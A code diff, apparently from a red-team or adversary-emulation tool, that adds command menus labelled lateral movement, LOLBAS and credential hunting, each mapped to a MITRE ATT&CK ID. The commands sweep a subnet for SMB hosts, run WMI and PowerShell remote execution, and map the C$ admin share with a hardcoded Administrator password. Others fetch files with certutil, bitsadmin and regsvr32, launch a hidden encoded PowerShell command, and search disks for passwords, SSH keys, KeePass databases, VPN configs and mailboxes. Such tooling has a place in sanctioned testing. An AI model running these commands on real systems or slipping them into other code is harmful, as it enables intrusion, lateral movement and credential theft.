@@ -84,6 +84,45 @@ const MODULES: Category[] = [
       { icon: '🗂️', label: 'ADCS Certs',           cmd: 'certutil -CAInfo 2>nul',                            tag: 'T1649' },
     ],
   },
+  {
+    id: 'lateral', icon: '↔️', label: 'LATERAL MOVE', atkId: 'TA0008',
+    cmds: [
+      { icon: '🔑', label: 'Cached Credentials',    cmd: 'cmdkey /list && net use',                                                     tag: 'T1021' },
+      { icon: '🌐', label: 'Find SMB Hosts',        cmd: 'for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i 2>nul | findstr TTL && net view \\\\192.168.1.%i /all 2>nul', tag: 'T1135' },
+      { icon: '📡', label: 'WMI Exec (loopback)',   cmd: 'wmic /node:127.0.0.1 process call create "cmd.exe /c whoami > C:\\Windows\\Temp\\wmi.txt" && timeout 2 && type C:\\Windows\\Temp\\wmi.txt', tag: 'T1047' },
+      { icon: '📋', label: 'PS Remote (loopback)',  cmd: 'powershell -c "Invoke-Command -ComputerName localhost -ScriptBlock { whoami; hostname }"', tag: 'T1021' },
+      { icon: '🔗', label: 'Net Shares (all)',      cmd: 'net view /all && net use',                                                    tag: 'T1135' },
+      { icon: '🖥️', label: 'RDP Sessions',         cmd: 'query user /server:127.0.0.1 2>nul; netstat -an | findstr :3389',             tag: 'T1021' },
+      { icon: '📁', label: 'Map Admin Share',       cmd: 'net use \\\\127.0.0.1\\C$ /user:Administrator P@ssw0rd 2>nul && dir \\\\127.0.0.1\\C$', tag: 'T1021' },
+      { icon: '🔑', label: 'Pass-the-Hash Check',  cmd: 'powershell -c "Get-WinEvent -LogName Security -MaxEvents 20 -FilterXPath \\"*[System[EventID=4624]]\\""', tag: 'T1550' },
+    ],
+  },
+  {
+    id: 'lolbas', icon: '🎭', label: 'LOLBAS', atkId: 'TA0005',
+    cmds: [
+      { icon: '📥', label: 'Certutil Download',     cmd: 'certutil -urlcache -split -f http://127.0.0.1/test.exe C:\\Windows\\Temp\\test.exe 2>nul && echo downloaded', tag: 'T1105' },
+      { icon: '📤', label: 'BITSAdmin Download',    cmd: 'bitsadmin /transfer job /download /priority high http://127.0.0.1/test.exe C:\\Windows\\Temp\\test.exe 2>nul', tag: 'T1197' },
+      { icon: '⚡', label: 'Regsvr32 COM Bypass',   cmd: 'regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll 2>nul',           tag: 'T1218' },
+      { icon: '📜', label: 'Mshta Execute',         cmd: 'mshta vbscript:Execute("msgbox chr(119)&chr(104)&chr(111)&chr(97)&chr(109)&chr(105)(window.close)")', tag: 'T1218' },
+      { icon: '🔧', label: 'Rundll32 Exec',         cmd: 'rundll32 shell32.dll,Control_RunDLL',                                        tag: 'T1218' },
+      { icon: '📋', label: 'InstallUtil Bypass',    cmd: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\test.exe 2>nul', tag: 'T1218' },
+      { icon: '🌐', label: 'IEX (Fileless PS)',     cmd: 'powershell -nop -w hidden -enc SABpACAAJQBVAFMAZQByAFAAcgBvAGYAaQBsAGUA',    tag: 'T1059' },
+      { icon: '💻', label: 'WScript Exec',          cmd: 'wscript //E:vbscript //B "C:\\Windows\\Temp\\test.vbs" 2>nul',               tag: 'T1059' },
+    ],
+  },
+  {
+    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
+    cmds: [
+      { icon: '🔑', label: 'Hunt Passwords',        cmd: 'findstr /si "password" C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.config 2>nul | head -20', tag: 'T1552' },
+      { icon: '📄', label: 'Hunt Config Files',     cmd: 'dir /s /b C:\\inetpub C:\\xampp C:\\wamp 2>nul | findstr /i ".config .env web.config appsettings" | head -20', tag: 'T1005' },
+      { icon: '🗝️', label: 'Hunt SSH Keys',        cmd: 'dir /s /b C:\\Users\\.ssh 2>nul; dir /s /b C:\\Users\\*id_rsa* 2>nul; dir /s /b C:\\Users\\*.pem 2>nul | head -20', tag: 'T1552' },
+      { icon: '💾', label: 'Hunt Databases',        cmd: 'dir /s /b C:\\ 2>nul | findstr /i ".mdf .ldf .sqlite .db3 .accdb" | head -20', tag: 'T1005' },
+      { icon: '📧', label: 'Hunt Emails/PST',       cmd: 'dir /s /b C:\\Users 2>nul | findstr /i ".pst .ost .msg" | head -15',         tag: 'T1114' },
+      { icon: '🔐', label: 'Hunt KeePass Files',    cmd: 'dir /s /b C:\\ 2>nul | findstr /i ".kdbx .kdb" | head -10',                 tag: 'T1552' },
+      { icon: '📡', label: 'Hunt VPN Configs',      cmd: 'dir /s /b C:\\ 2>nul | findstr /i ".ovpn .vpn .rdp .pcf" | head -15',       tag: 'T1552' },
+      { icon: '🌐', label: 'Hunt Source Code',      cmd: 'dir /s /b C:\\Users C:\\Projects C:\\repos 2>nul | findstr /i ".git .svn Gemfile requirements.txt" | head -15', tag: 'T1005' },
+    ],
+  },
 ]
 
 function joinWin(base: string, name: string) { return base.replace(/[/\\]+$/, '') + '\\' + name }
